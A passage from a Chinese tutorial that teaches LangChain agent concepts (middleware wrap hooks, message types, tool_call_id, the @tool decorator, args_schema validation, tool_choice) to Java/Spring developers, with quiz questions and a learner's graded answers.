    # 你想重试？没门——"调模型"不归你管
    return request
```

wrap_model_call 像 `@Around`：你拿到一个 `handler`，`await handler(request)` 才是真正调模型。调用权在你手里，所以能重试：

```python
async def wrap_model_call(self, request, handler):
    for attempt in range(3):                # ← 你能循环
        try:
            return await handler(request)   # ← 你决定调、调几次
        except Exception:
            await asyncio.sleep(2 ** attempt)
    raise last_error
```

`handler` 就是 Spring `@Around` 里的 `ProceedingJoinPoint.proceed()`--你不 proceed，方法就不执行；你 proceed 多次，方法就执行多次。

#### 「包住」能做、before_* 做不到的四件事

1. **调不调**：缓存命中就不调 handler，直接返回缓存
2. **调几次**：失败重试 N 次
3. **改参数**：调 handler 前改 request
4. **改结果**：handler 返回后改 response

before_* 只能做 3（before_model 改参数）和有限的 4（after_model 改结果），1 和 2 完全做不了。

#### wrap_tool_call 同理

包住的是「调工具」这个动作。万物云 ToolGuardMiddleware 用它做：
- 调 handler 前：查权限（非管理员不能调删除工具）
- `result = await handler(request)`：真正调工具
- 调 handler 后：记审计日志
- 工具抛异常时：catch 住，转成错误信息返回给模型（不让异常打断整个 agent）

#### 回到上一道检查题

「为什么 RetryMiddleware 要用 wrap_model_call 而不是 before_model」现在有答案了：**重试需要多次调模型，只有 wrap_* 能控制「调几次」；before_* 控制不了调用动作，只能调一次。**

#### 第6步补充二检查题

用 Spring 的话说：wrap_model_call 和 before_model 分别对应哪个注解？为什么用 `@Before` 做不了重试，必须用 `@Around`？

答出来再走第7步。

#### 第6步检查题答案（补充二复盘）

你的回答暴露了一个关键误解：「@Before 调用前执行一次，@Around 调用前和调用都执行」。

前半对，后半是误解。@Around 不是「前后都执行」，而是 **你完全接管了目标方法的调用，目标方法不会自动执行，只有你调 `proceed()` 它才执行。** 这个不搞懂，wrap 永远理解不了，下面专门讲。

---

### 第6步补充三：先把 Spring @Around 搞懂（前置概念）

#### @Before vs @Around 的真正区别

```java
// @Before：目标方法一定会自动执行一次，你只是在它之前插一段
@Before("execution(* Service.*(..))")
public void logBefore(JoinPoint jp) {
    log.info("调用前");
    // 跑完这行，目标方法自动执行（一次）。你管不了它执不执行、执行几次。
}

// @Around：目标方法不会自动执行！只有你 proceed() 它才执行
@Around("execution(* RpcClient.call(..))")
public Object retry(ProceedingJoinPoint pjp) throws Throwable {
    for (int i = 0; i < 3; i++) {
        try {
            return pjp.proceed();   // ← 这一行才真正调用目标方法
        } catch (Exception e) {
            Thread.sleep(2000);     // 失败等2秒
        }
    }
    throw new RuntimeException("重试3次都失败");
}
```

盯住 `pjp.proceed()` 这一行：
- **不写 proceed()** → 目标方法根本不执行（可做缓存短路：缓存命中直接返回，不调目标）
- **写一次** → 目标方法执行一次（正常）
- **写在 for 循环里** → 目标方法执行多次（**重试！**）
- proceed() 前后还能改参数、改返回值

**所以重试能实现，是因为 `proceed()` 在你的 for 循环里，你让它执行几次就几次。** @Before 没有这个 proceed()，目标方法自动执行一次，你控制不了。

#### 映射到 wrap_model_call

```
没有 middleware：    框架 → 直接调模型（一次）
before_model：       框架 → 调你的 before_model → 再调模型（一次，自动）
wrap_model_call：    框架 → 调你的 wrap_model_call（模型不会自动调！）
                           └─ 你在里面调 handler() 才触发模型
```

`handler` = `pjp.proceed()`，完全对应。

#### 回答你那句「是 wrap_model_call 注解下有写啥逻辑吗」

是的，**重试逻辑就是你自己写在 wrap_model_call 方法体里的**。框架不自动重试--框架只给你「包住模型调用」的机会，里面写什么（重试？缓存？限流？）全是你自己写的代码：

```python
async def wrap_model_call(self, request, handler):
    # ↓ 这整个 for 循环是你写的重试逻辑
    for attempt in range(3):
        try:
            return await handler(request)   # handler = proceed
        except Exception:
            await asyncio.sleep(2 ** attempt)
    raise last_error
```

框架的活：把「调模型」替换成「调你的 wrap_model_call，把 handler 传给你」。
你的活：在 wrap_model_call 里决定怎么调 handler（重试几次、要不要调、调完怎么处理）。

#### 第6步补充三检查题

用你自己的话回答两点：
1. @Around 里如果不写 `pjp.proceed()`，目标方法会怎样？
2. 为什么 @Around 能做重试而 @Before 不能？关键在哪一行？

答出来再走第7步。

#### 第6步补充三检查题答案（复盘）

你的回答：
1. 不写 proceed() 则不会执行目标方法
2. 关键是可以在 proceed 前后写业务逻辑，比如循环

✅ 第1问完全正确。
第2问方向对（循环这个例子抓得准），再精确一点：关键不是「前后写逻辑」（这个 @Before+@After 也能），而是 **proceed() 控制权本身归你**--你能决定调不调、调几次。关键那一行就是 `for` 循环里的 `pjp.proceed()`--因为它在你的循环里，你让它跑几次就几次，所以能重试；@Before 没有 proceed()，目标方法自动跑一次，控制不了。

> Middleware 核心到此通了：六个钩子（补充）+ 触发频率 + wrap 的「包住」= @Around（补充二/三）。原路线图第7、8步内容已并入上面补充，下面直接看完整代码收尾。

---

### 第7步：手写一个完整的 Middleware（ToolGuardMiddleware 收尾）

前面看的都是零碎代码片段，这步看一个**完整、能上生产**的 middleware，把钩子、wrap、异常处理串起来。选 ToolGuardMiddleware（工具权限+审计+异常转换），因为它用 wrap_tool_call，能展示「包住」的全部用法。

```python
from langchain.agents import AgentMiddleware

class ToolGuardMiddleware(AgentMiddleware):
    async def wrap_tool_call(self, request, handler):
        tool_name = request.name
        tool_args = request.args

        # 1. proceed 前：权限检查
        if tool_name in DANGEROUS_TOOLS:            # 删除设备、退款等
            user_role = request.config.get("user_role", "guest")
            if user_role != "admin":
                raise PermissionError(f"非管理员不能调 {tool_name}")

        # 2. proceed 前：审计日志（开始）
        print(f"[AUDIT] 调用工具 {tool_name}, 参数: {tool_args}")

        # 3. 真正调工具 = proceed
        try:
            result = await handler(request)         # ← 包住的"调工具"动作
        except Exception as e:
            # 4. 异常转换：catch 住，转成错误信息返回给模型（关键生产做法）
            print(f"[ERROR] 工具 {tool_name} 失败: {e}")
            return f"工具执行失败：{e}。请换方式或告知用户。"

        # 5. proceed 后：审计日志（结果）
        print(f"[AUDIT] 工具 {tool_name} 返回: {str(result)[:100]}")
        return result
```

#### 这个 middleware 展示了「包住」的五段

| 段 | 位置 | 做什么 |
|---|------|--------|
| 1 | proceed 前 | 权限检查（不通过直接抛） |
| 2 | proceed 前 | 审计开始日志 |
| 3 | proceed | `await handler(request)` 真正调工具 |
| 4 | 异常时 | catch 住，转错误信息返回（不让 agent 崩） |
| 5 | proceed 后 | 审计结果日志 |

#### 生产关键：工具失败要返回错误信息，不要抛异常

看第 4 段--工具抛异常时 catch 住，**返回一段错误信息字符串**，不让异常往上抛。

为什么？抛异常会让整个 agent 循环中断，用户直接收到 500。返回错误信息的话，模型会看到「工具失败了」，能自己决定下一步：换工具、换参数重试、或告诉用户"这个操作暂时做不了"。

后端类比：跟你 Java 里 DAO 抛异常、Controller 返回错误码一个道理--别把底层异常直接甩给前端，转成调用方能处理的错误信息。

#### 整体后端类比

ToolGuardMiddleware 就是一个 `@Around` 切面包住工具调用：proceed 前做权限+审计，proceed 后做审计+异常转换。跟你写的 `@Around` 包 DAO 方法做权限+审计+异常转换，结构一模一样。

#### 第7步检查题

看上面 ToolGuardMiddleware 代码回答：
1. 如果工具执行抛异常，这个 middleware 是让 agent 崩掉，还是返回错误信息？为什么这么设计？
2. 权限检查（第1段）为什么放在 `await handler(request)` 之前，不能放之后？

答出来再走第8步。

#### 第7步检查题答案（复盘）

你的回答：
1. try catch 捕获异常信息，不至于中断进程会话，把信息给 agent 让他判断
2. 没权限就不让执行，不然浪费 token 而且也查到信息了，万一后面报异常给他拿到没权限的信息了

✅ 第1题对。补精确：中断的是 agent 的 **while 循环**（不是进程/会话本身）；返回错误信息让模型自己决定换工具/换参数/告知用户。
✅✅ 第2题答出三个理由--不浪费 token、不白查、**防止越权拿信息**。最关键是第三个（安全）：权限检查必须在执行前（fail-fast），否则工具已跑、数据已查出，即使后面拒绝，没权限的信息可能已泄露。这是纵深防御，跟 Java 权限过滤器放最前面一个道理。

> Middleware 模块完结（第6步 + 三个补充 + 第7步完整代码）。下面进入消息模型。

---

### 第8步：四种消息类型（System / Human / AI / Tool）

换模块了--进入**消息模型**。其实你在第2步已经见过这四种消息了（客服例子的 messages 列表），这步正式给它们名字和分工。

#### 四种消息类型

| 类型 | 谁产生的 | 作用 | Java 类比 |
|------|---------|------|----------|
| **SystemMessage** | 你（开发者）写的 | 系统级指令、角色约束、规则 | web.xml / application.yml 全局配置 |
| **HumanMessage** | 用户输入的 | 用户这一轮说了啥 | `@RequestBody` 接收的前端请求 |
| **AIMessage** | 模型返回的 | 模型输出，**可能包含 tool_calls**（要调工具） | Service 返回的 `Result<T>`，可能含"下一步调哪个子服务" |
| **ToolMessage** | 工具执行后产生的 | 工具结果，返回给模型看 | DAO 查询后返回给 Service 的数据 |

#### 对照：第2步那个例子的消息序列

第2步客服例子里，messages 是这样长的：

```
[0] SystemMessage("你是客服助手...")        ← 你写的全局规则
[1] HumanMessage("帮我查订单 ORD-001...")   ← 用户输入
[2] AIMessage("好的我先查", tool_calls=[search_order])  ← 模型决定调工具
[3] ToolMessage("订单已发货")              ← 工具结果
[4] AIMessage("已发货不能退款...")          ← 模型最终回答（无 tool_calls，循环结束）
```

现在每条都有名字了。规律：
- **SystemMessage** 永远在最前面，全局一般只有一条
- **HumanMessage** 是用户每轮的输入
- **AIMessage + ToolMessage 成对出现**：模型要调工具就发一条 AIMessage（带 tool_calls），工具执行完回一条 ToolMessage。第2步讲过，一轮循环通常加这两条
- 最后一条 **AIMessage** 没有 tool_calls = 任务完成，循环结束

#### 后端类比（整条链路）

把它想成一个请求处理链：

```
全局配置(SystemMessage) + HTTP请求(HumanMessage)
    -> Service 处理
    -> Service 返回"要调子服务X"(AIMessage with tool_calls)
    -> 子服务X返回数据(ToolMessage)
    -> Service 再处理
    -> Service 返回最终结果给前端(AIMessage，无 tool_calls)
```

SystemMessage = web.xml 全局配置；HumanMessage = @RequestBody；AIMessage = Service 返回值（可能指示下一步调谁）；ToolMessage = DAO/子服务返回值。完全对应你熟的 Java 请求链。

#### 生产现实（先记一条，tool_call_id 下一步详讲）

AIMessage 里的 tool_calls 带一个 `id`，对应的 ToolMessage 必须带 `tool_call_id` 跟它匹配。模型一轮可能并发发**多个**工具调用（比如同时查订单+查物流），不关联 id 模型就分不清哪个结果对应哪个请求。这个第9步专门讲。

#### 第8步检查题

看第2步那个客服例子的消息序列（上面 [0]~[4]），回答：
1. [2] 和 [3] 为什么成对出现？它们分别是什么类型？
2. 怎么从消息序列判断"循环该结束了"？

答出来再走第9步。

#### 第8步检查题答案（复盘）

你的回答：1. 不清楚；2. 没有 ToolMessage。

Q2 答的是「果」不是「因」，Q1 没吃透。下面补。

#### 补一下：成对和结束的真正判断

**Q1：[2] 和 [3] 为什么成对？**

- [2] 是 **AIMessage**，带 `tool_calls`--模型在说「我要调 search_order 这个工具」
- [3] 是 **ToolMessage**--工具执行后的结果

成对是因为**因果关系**：模型每决定调一个工具，框架就执行它、把结果作为 ToolMessage 塞回 messages。**一次工具调用 = 一对 `AIMessage(tool_calls)` + `ToolMessage(结果)`**。这就是第2步说的「一轮循环加 2 条」。

后端类比：[2] 像 Service 返回「我要调子服务 X」，[3] 像子服务 X 的返回值。子服务的返回必然是因为 Service 先请求了它--没有请求就没有返回，所以它们成对。

**Q2：循环结束的真正信号**

「没有 ToolMessage」是**果**，不是因。真正判断循环结束的信号是：**最后一条 AIMessage 没有 `tool_calls`**。

```
模型这条 AIMessage 没有 tool_calls
  → 不执行工具
  → 不生成 ToolMessage（所以你观察到"没有 ToolMessage"）
  → 循环结束
```

所以要看的不是「有没有 ToolMessage」，而是「AIMessage 有没有 tool_calls」。有 tool_calls → 继续循环；没有 → 结束。

#### 第8步补一下检查题

如果模型返回的一条 AIMessage 里没有 tool_calls，后面还会不会出现 ToolMessage？为什么？循环会怎样？

答出来再走第9步。

#### 第8步补一下检查题答案（复盘）

你的回答：「下一轮就不会有 ToolMessage，就结束循环了。」

✅ 结论对：没有 tool_calls -> 不生成 ToolMessage -> 循环结束。

补 why：`tool_calls` 是模型「要求调工具」的信号。没有 tool_calls = 模型没要求调工具 = 框架不执行工具 = 不生成 ToolMessage。ToolMessage 永远是 tool_calls 触发的，没 tool_calls 就没 ToolMessage，循环也就没了继续的理由。

（小精确：不是「下一轮」没有，而是这一条 AIMessage 后面就没有 ToolMessage 了，而且因为没有 tool_calls，**根本就没有下一轮**--循环直接结束。）

---

### 第9步：tool_call_id 为什么必须关联

第8步说 AIMessage(tool_calls) + ToolMessage 成对。这步讲这对里的一个关键细节：**ToolMessage 必须带 `tool_call_id`，关联到 AIMessage 里对应的 tool_call。**

#### 为什么需要 id？因为模型一次可能发多个工具调用

模型不是每次只调一个工具。它可能在一个 AIMessage 里同时发多个 tool_calls（并行调用，性能优化）：

```python
# 模型一次发了两个工具调用
AIMessage(
    content="我帮您同时查订单和物流",
    tool_calls=[
        {"name": "search_order",    "args": {"order_id": "ORD-001"}, "id": "call_a"},
        {"name": "query_logistics", "args": {"order_id": "ORD-001"}, "id": "call_b"},
    ]
)
```

执行后，两个工具各回一条 ToolMessage，**每条必须带对应的 id**：

```python
ToolMessage(content="订单已发货",    tool_call_id="call_a")   # 对应 search_order
ToolMessage(content="物流到转运中心", tool_call_id="call_b")   # 对应 query_logistics
```

不关联 id 的话，模型拿到两条 ToolMessage，分不清哪条是订单、哪条是物流--可能把物流结果当订单状态，给错答案。

#### 后端类比（你最熟的）

这就是**异步请求-响应的关联问题**，你后端天天遇到：

1. **CompletableFuture 回调关联**：并发发两个异步请求，两个回调返回时你得知道哪个回调对应哪个请求，靠某种 id 关联。
2. **MQ 的 correlationId**：往 RabbitMQ 发消息带 correlationId，消费者响应带同一个 id，才能把响应跟原始请求配对。
3. **支付回调**：异步回调回来带订单号，靠订单号把回调和订单关联。

`tool_call_id` 就是这个 correlationId--模型发 N 个工具调用（N 个 id），执行完回 N 个 ToolMessage，靠 id 一一配对。

#### 生产现实

- **id 是框架自动生成和管理的**：模型返回 tool_calls 时自带 id，你写工具函数时不用管。但要确保 ToolMessage 带上正确的 `tool_call_id`（框架的 ToolNode 一般自动处理）。
- **关联错/漏的后果**：模型会困惑，可能重复调用同一工具、或张冠李戴给错答案。生产里用自定义工具执行逻辑时，最容易漏的就是 id。
- **并行调用是性能优化**：模型一次发多个 tool_calls，框架并行执行，比串行快。万物云查询类场景会用到（同时查多个设备状态）。

#### 第9步检查题

模型一条 AIMessage 同时发了两个 tool_calls：search_order(id=call_a) 和 query_logistics(id=call_b)。回答：
1. 执行后 messages 里会多几条什么类型的消息？每条要带什么？
2. 如果两条 ToolMessage 都没带 tool_call_id，会出什么问题？

答出来再走第10步。

#### 第9步检查题答案（复盘）

你的回答：1. ToolMessage，都带 tool_id；2. 不清楚是哪个 tool 返回的。

✅ 第1题对：多 2 条 ToolMessage（因为 2 个 tool_calls），每条带对应的 `tool_call_id`（call_a、call_b）。（小精确：是 `tool_call_id` 不是 tool_id）
✅ 第2题方向对：模型分不清哪个结果对应哪个工具。补后果：分不清 -> 可能**张冠李戴**（把物流结果当订单状态）-> 给错答案；或以为没拿到结果 -> **重复调用**同一工具。

> 消息模型模块完结（第8步四种消息 + 第9步 tool_call_id）。下面进入工具系统。

---

### 第10步：@tool 装饰器做了什么（= @Component + @RequestMapping + Swagger）

进入**工具系统**。第1步说过 Agent 循环里模型会调工具，那工具怎么定义？就是用 `@tool` 装饰器。

#### @tool 的基本写法

```python
from langchain_core.tools import tool

@tool
def search_order(order_id: str) -> str:
    """根据订单ID查询订单状态。"""
    return f"订单 {order_id} 状态：已发货"
```

一个普通函数，加个 `@tool`，就变成框架能调度的工具。

#### @tool 做了四件事

1. 把函数包装成 `BaseTool` 实例（注册为框架管理的工具）
2. 从函数签名提取参数信息（名字、类型）--`order_id: str`
3. 从 docstring 提取工具描述--`"""根据订单ID查询订单状态。"""`
4. 生成 JSON Schema 供模型参考（模型靠这个知道怎么调）

#### 后端类比（一击命中）

`@tool` = Spring 的 **`@Component` + `@RequestMapping` + Swagger `@ApiOperation` 三合一**：

| Spring 注解 | @tool 对应做的事 |
|------------|----------------|
| `@Component` | 注册为框架管理的 Bean（工具被框架接管） |
| `@RequestMapping` | 定义访问路径（工具名 `search_order`） |
| `@ApiOperation` | 生成 API 文档（描述 + 参数 schema，给模型看） |

三件事一个装饰器全干了。

#### 一个关键认知：工具描述是给模型看的 API 文档

Java 里你写 Swagger 文档是给**其他开发者**看的。Agent 里工具描述是给 **AI 模型**看的--它决定了模型是否理解、何时选择、如何填参数。写工具描述本质就是给模型写 API 文档。这个下一页（第11步）专门讲，先记住这个认知转变。

#### 生产现实：Python 装饰器 ≠ Java 注解

这是 Java 转 Python 容易踩的坑：

- **Java 注解**（`@Component`）只是个**标记**，本身不执行任何逻辑，要靠 AOP 框架/Spring 容器配合才生效。
- **Python 装饰器**（`@tool`）是**高阶函数**，它接收原函数、返回一个新函数（BaseTool 实例），**本身就执行了包装逻辑**，不依赖外部框架。

所以 `@tool` 加上去的那一刻，函数已经被包装成 BaseTool 了，不需要像 Java 那样等容器启动扫描。这是两种语言的本质区别。

#### 第10步检查题

1. `@tool` 装饰器等于 Spring 哪三个注解的合体？
2. Python 的 `@tool` 装饰器和 Java 的 `@Component` 注解，本质区别是什么？

答出来再走第11步。

#### 第10步检查题答案（复盘）

你的理解：「@tool 就是标明函数是工具类，可以放进 agent 的 tools list 里。」

✅ 表面行为对，但没抓到机制（"标记"是 Java 思维）。下面专门讲。

---

### 第10步补充：Python 装饰器到底是个啥（前置概念）

#### 一句话定义

**装饰器就是一个"接收函数、返回新函数（或对象）"的函数。** `@xxx` 只是语法糖。

#### 语法糖：@x 等价于赋值

```python
@log
def hello(name):
    return f"hi {name}"

# 完全等价于：
def hello(name):
    return f"hi {name}"
hello = log(hello)   # ← 把 hello 这个名字重新指向 log() 返回的东西
```

`@log` 不是"标记"，它就是**调用 `log(hello)`，把返回值重新绑定到 `hello` 这个名字上**。原来 hello 指向原函数，现在指向 log 返回的新东西。

#### 一个最小例子看机制

```python
# log 是装饰器：接收函数 func，返回新函数 wrapper
def log(func):
    def wrapper(*args, **kwargs):
        print(f"调用 {func.__name__}")
        result = func(*args, **kwargs)       # 在 wrapper 里调原函数
        print(f"完成 {func.__name__}")
        return result
    return wrapper    # 返回新函数

@log
def hello(name):
    return f"hi {name}"

hello("张三")
# 打印：
# 调用 hello
# hi 张三        ← 原函数的返回值
# 完成 hello
```

`@log` 之后，`hello` 不再是原来那个函数，而是 `wrapper`。调 `hello("张三")` 实际调的是 `wrapper("张三")`，wrapper 在原函数前后加了打印。**装饰器没改原函数代码，但"换掉"了它。**

#### 映射到 @tool

```python
@tool
def search_order(order_id: str) -> str:
    """根据订单ID查询订单状态。"""
    return f"订单 {order_id} 状态：已发货"

# 等价于：
search_order = tool(search_order)
```

`tool(search_order)` 返回一个 **BaseTool 实例**（不是普通函数了，是个对象，里面装着工具名、描述、参数 schema、原函数）。所以 `search_order` 这个名字现在指向一个 BaseTool 对象--这就是为什么能放进 `tools=[search_order]`：它已经被**转换**成工具了，不是被"标记"成工具。

#### 和 Java @Component 的本质区别（这下清晰了）

| | Java `@Component` | Python `@tool` |
|---|---|---|
| 本质 | **被动标记**（metadata） | **主动调用**（函数调用） |
| 谁干活 | Spring 容器启动时扫描注解，由容器注册 Bean | `tool(search_order)` 这一行**自己**执行，返回 BaseTool |
| 何时生效 | 容器启动时 | **模块被 import 时**（Python 执行到这行就跑了） |
| 注解/装饰器本身 | 不执行任何逻辑 | 就是函数调用，执行包装逻辑 |

一句话：**Java 注解是贴标签等别人来读；Python 装饰器是当场执行转换。** 所以 @tool 不需要 Spring 那样的容器，import 完就已经是工具了。

#### 第10步补充检查题

1. `@tool def search_order(...)` 等价于哪一行代码？执行后 `search_order` 这个名字指向什么类型的东西？
2. 为什么说 Python `@tool` 不需要像 Java `@Component` 那样等容器启动？它什么时候就生效了？

答出来再走第11步。

#### 第10步补充检查题答案（复盘）

> 用户额外提了一个好问题：「装饰器是不是就是类似 @Around 注解？」先回答这个。

**装饰器 ≈ @Around 吗？**

写法上：是的，很像。装饰器的 `wrapper`（前 + 调原函数 + 后）跟 @Around 的 advice（前 + `pjp.proceed()` + 后）结构一模一样。前面给的 log 装饰器就等于一个 @Around 计时切面。

机制上：不一样。@Around 是注解（标记），真正织入靠 Spring 运行时创建动态代理；装饰器自己就是织入动作，import 时就把原函数换成 wrapper，不需要运行时框架。

所以：**装饰器 = @Around 的 advice 代码 + Spring AOP 运行时织入，两个角色合一起了。** 写法像 @Around，干的活像 Spring AOP 运行时。

**两个检查题回答（用户让我直接答）：**

1. `@tool def search_order(...)` 等价于 `search_order = tool(search_order)`。执行后 `search_order` 不再是普通函数，指向一个 **BaseTool 实例**（对象，装着工具名/描述/参数 schema/原函数）。这就是为什么能放进 `tools=[search_order]`--它已经是 BaseTool 对象了，不是被标记。

2. 因为 `@tool` 是**主动调用**（`tool(search_order)` 这行自己执行），不是被动标记。Python 在 **import 这个模块时**就执行到这行，当场把函数转成 BaseTool 并重新绑定名字。import 完就是工具了，不需要像 `@Component` 那样等 Spring 容器启动扫描。

> 工具系统继续。下面讲工具描述。

---

### 第11步：工具描述为什么重要（给模型看的 API 文档）

第10步说了"工具描述是给模型看的 API 文档"，这步展开为什么重要、怎么写。

#### 工具描述写不好会出三类问题

1. **模型不选这个工具**：描述太模糊，模型不确定什么时候用，就忽略它
2. **模型选错工具**：两个工具描述相似，模型选错（万物云真实踩过）
3. **模型参数填错**：参数描述不清，模型传入错误格式的参数

#### 坏描述 vs 好描述

```python
# 坏：模型不知道什么时候用
@tool
def search(query: str) -> str:
    """搜索"""
    return results

# 好：模型知道什么时候用、怎么用
@tool
def search_order(order_id: str) -> str:
    """根据订单ID查询订单的当前状态和物流信息。

    使用场景：当用户询问订单状态、物流进度、发货情况时使用。
    参数说明：order_id 是订单编号，格式如 'ORD-YYYYMMDD-XXX'。
    返回内容：订单状态（待付款/已付款/已发货/已签收）和最新物流信息。
    """
    return results
```

好描述三要素：**使用场景 + 参数说明 + 返回内容**。

#### 万物云真实案例

万物云有 12 个 Skill（工具），曾经「查询设备状态」和「查询设备历史数据」两个工具经常被模型混淆。后来在描述里明确加了：
- 「当用户问**当前状态**时用这个」（设备状态）
- 「当用户问**历史趋势**时用那个」（历史数据）

混淆率就降下来了。

#### 后端类比

跟写 REST API 文档一个道理--文档不清，调用方就用错。只不过这里的"调用方"是 AI 模型。你写 Swagger 文档有多认真，写工具描述就该有多认真。

#### 生产现实

- **工具描述占 token**：工具名、描述、参数 schema 都被转成 JSON 发给模型。20 个工具可能占 2000+ token。所以描述要**精简但准确**，不是越长越好。
- **描述直接影响三个指标**：选不选（召回）、选对没（精确）、参数对没（准确）。
- **混淆是真实问题**：工具多了，描述相近的工具容易混。万物云 12 个 Skill 就踩过。

#### 第11步检查题

工具描述写不好会出哪三类问题？万物云「查询设备状态」和「查询设备历史数据」被混淆，最后是怎么解决的？

答出来再走第12步。

#### 第11步检查题答案（复盘）

1. **三类问题**（用户原答）：选不选、选对没、参数是否正确。
   - 标准：选不选=召回（模型不选这个工具）、选对没=精确（选错工具）、参数对没=准确（参数填错）。用户三个全中。

2. **怎么解决**（用户原答）：描述里明确 prompt/说明。
   - 标准补充：方向对--在描述里**明确写清楚使用场景**。万物云具体做法是给两个相似工具各画一条清晰边界：「当用户问**当前状态**时用这个 / 当用户问**历史趋势**时用那个」，模型就知道该选哪个了。

---

### 第12步：args_schema 参数校验（= Spring @Valid + DTO）

第11步说了工具描述给模型看，这步讲**参数校验**--模型传进来的参数对不对，谁来管。

#### 不写 args_schema 也能用

`@tool` 会自动从函数签名 + type hints + docstring **推断**出参数 schema 发给模型：

```python
@tool
def search_order(order_id: str) -> str:
    """查询订单。order_id 是订单编号。"""
    ...
```

这能用，但校验**弱**--只能告诉模型"order_id 是字符串"，管不了"格式必须是 ORD-YYYYMMDD-XXX"。

#### 严谨做法：args_schema = Pydantic Model

```python
from pydantic import BaseModel, Field, field_validator

class SearchOrderArgs(BaseModel):
    """订单查询参数（= DTO 类）"""
    order_id: str = Field(
        ...,
        description="订单编号，格式如 ORD-YYYYMMDD-XXX"
    )
    start_date: str | None = Field(None, description="起始日期 YYYY-MM-DD")
    end_date: str | None = Field(None, description="结束日期 YYYY-MM-DD")

    @field_validator("order_id")
    @classmethod
    def check_order_id_format(cls, v):
        if not v.startswith("ORD-"):
            raise ValueError("订单编号必须以 ORD- 开头")
        return v

@tool(args_schema=SearchOrderArgs)
def search_order(order_id: str, start_date=None, end_date=None) -> str:
    """根据订单ID查询订单状态。"""
    ...  # 进到这里时，参数已经校验过了
```

校验失败会**抛 ValidationError，工具函数根本不会执行**。

#### 后端类比（这是重点）

| Agent 工具 | Spring 后端 |
|---|---|
| `Pydantic Model`（带 Field + validator） | `DTO 类`（带 `@NotBlank`/`@Pattern` 注解） |
| `@tool(args_schema=...)` | Controller 方法参数上的 `@Valid` |
| 校验失败抛 `ValidationError`，工具不执行 | 校验失败抛 `MethodArgumentNotValidException`，Controller 不执行 |
| 校验在工具执行前 | 校验在 Controller 执行前（`@Valid` 拦截器） |

一句话：**args_schema 就是给工具加 @Valid，Pydantic Model 就是 DTO。**

#### 为什么要在工具执行前校验（而不是进函数里再判断）

后端类比：你不会在 Service 里手写 `if (order_id == null) throw`，而是在 DTO + @Valid 层统一拦。同理工具也不该在函数体里手写校验。

原因：
1. **统一收口**：所有工具的校验规则写一处（Pydantic Model），不散落在每个工具函数里
2. **失败行为可控**：校验失败抛 ValidationError，Agent 框架捕获后把错误信息回给模型，模型**自己决定下一步**（重新调 / 问用户）--跟第10步"工具失败返回错误信息不抛异常中断"是配套的
3. **防幻觉**：模型编的参数（假订单号）在门口就被拦，不会进到工具函数去查库

#### 万物云踩过的坑

没加 order_id 格式校验时：模型**编了一个不存在的订单号**，工具去查库返回空，模型又对着空结果**编了订单状态**（幻觉）。

加了 `check_order_id_format` 校验后：模型传错格式直接被拦，错误信息回给模型，模型要么重新调（这次格式对），要么问用户"请提供正确的订单号"。**幻觉从源头断了**。

#### 生产现实

- 不写 args_schema 能跑，但校验弱、防不住幻觉
- args_schema 能做复杂校验：正则、范围、枚举、**字段间依赖**（如 `end_date > start_date`，Pydantic 用 `@model_validator` 做）
- 万物云所有工具都用 args_schema，不裸用 type hints

#### 第12步检查题

1. `args_schema` 在后端类比里相当于 Spring 的什么？Pydantic Model 相当于什么？
2. 为什么要在**工具执行前**做参数校验，而不是进了工具函数再判断？万物云没加 order_id 格式校验时出了什么问题？

答出来再走第13步。

#### 第12步检查题答案（复盘）

1. **类比**（用户原答）：args_schema = @Valid（valiade→validate），Pydantic Model = DTO + @NotBlank。
   - 标准：完全正确。Pydantic Model = 带校验注解的 DTO 类，args_schema = 把它挂上去触发校验的 @Valid。

2. **为什么执行前校验**（用户原答）：进了容易报错和产生幻觉。
   - 标准补充：**幻觉**✓ 核心--没在门口拦，模型编的假参数溜进工具查库，查空了模型又编结果。**报错**要 sharpen：关键不是"会不会报错"而是"报错了谁接"--函数体里手动抛异常没人接就冒泡中断 agent 循环（用户收 500）；args_schema 校验失败抛 ValidationError 被框架接住，转成错误信息回给模型，循环不中断。再加统一收口。万物云链路：编假订单号→查库空→编状态（幻觉），加校验后假号在门口被拦，从源头断。

---

### 第13步：tool_choice（控制调不调工具）+ 工具失败处理

这步讲两件事：怎么**控制模型调不调工具**，以及**工具失败了怎么办**。

#### tool_choice：控制模型调不调工具

`tool_choice` 是绑在 agent/模型调用上的一个参数，控制模型这一轮**要不要调工具**：

| 取值 | 含义 | 客服类比 |
|---|---|---|
| `"auto"`（默认） | 模型自己决定调不调 | 客服自己判断要不要查系统 |
| `"required"` / `"any"` | 必须调一个工具，不许空手回 | 这通必须上手查系统才能回 |
| `"none"` | 不许调工具，只能用嘴回 | 这通纯聊天，不用查系统 |
| 指定工具名 | 必须调这个工具 | 这通必须走某个固定流程 |

**实际怎么传进去：在 `bind_tools` 时传**（绑定工具的同时设定调用策略）：

```python
from langchain.chat_models import init_chat_model
from langchain.agents import create_agent

# 1. 准备工具
@tool
def query_order(order_id: str) -> str:
    """根据订单ID查询订单状态。当用户问订单/物流进度时用。"""
    ...

@tool
def query_device(device_id: str) -> str:
    """查询设备当前状态。当用户问设备当前状态时用。"""
    ...

tools = [query_order, query_device]

# 2. 关键：bind_tools 时传 tool_choice
model = init_chat_model("openai:gpt-4o")

chat_model  = model.bind_tools(tools, tool_choice="auto")      # 闲聊：自己决定
query_model = model.bind_tools(tools, tool_choice="required")  # 查询：必须查（防不查就编）
order_model = model.bind_tools(tools, tool_choice="query_order")  # 固定流程：必须调这个
# 部分 provider 指定工具用字典：tool_choice={"type": "tool", "name": "query_order"}

# 3. 不同 model 实例建不同 agent
chat_agent  = create_agent(model=chat_model,  tools=tools, system_prompt="你是万物云客服...")
query_agent = create_agent(model=query_model, tools=tools, system_prompt="你是万物云客服...")
```

**万物云动态切换（配合第5步定制拓扑：分类 -> 路由）**

`bind_tools` 是建 agent 时绑死的，不能一个 agent 一会儿 required 一会儿 auto。万物云做法是**分类后路由到不同 agent**：

```python
def classify(state):
    intent = llm_classify(state["messages"][-1].content)  # 业务查询 / 闲聊
    return {"intent": intent}

def route(state):
    if state["intent"] == "业务查询":
        return "query_agent"   # required，必须查
    return "chat_agent"        # auto，自由回
```

**后端类比**：`bind_tools(tool_choice=...)` = 给 Service 注入"操作权限配置"；不同 model 实例 = 不同配置的 Service Bean；分类路由 = 前置 Controller 按请求类型转发到不同 Service。

**生产踩过的坑（重点）**：
1. **required 用在寒暄场景反而造幻觉**：用户说"你好"，required 逼模型必须调工具，模型可能强行调 query_order 还编个订单号--防幻觉的工具反而制造幻觉。所以 required 只用在确实要查系统的场景。
